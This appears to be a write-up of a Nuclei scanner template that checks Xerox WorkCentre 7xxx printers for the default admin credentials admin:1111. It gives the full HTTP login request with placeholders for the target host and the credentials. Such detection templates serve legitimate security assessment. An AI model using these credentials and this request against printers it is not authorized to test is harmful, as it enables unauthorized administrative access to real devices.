# Nuclei Template: Xerox WorkCentre 7xxx Printer Default Login
**Template ID:** xerox7-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`xerox7-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Xerox WorkCentre 7xxx printer. default admin credentials admin:1111 were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /userpost/xerox.set HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername={{username}}&webPassword={{password}}&frmaltDomain=default
```

## References
- https://www.support.xerox.com/en-us/article/en/x_wc7556_en-O23530
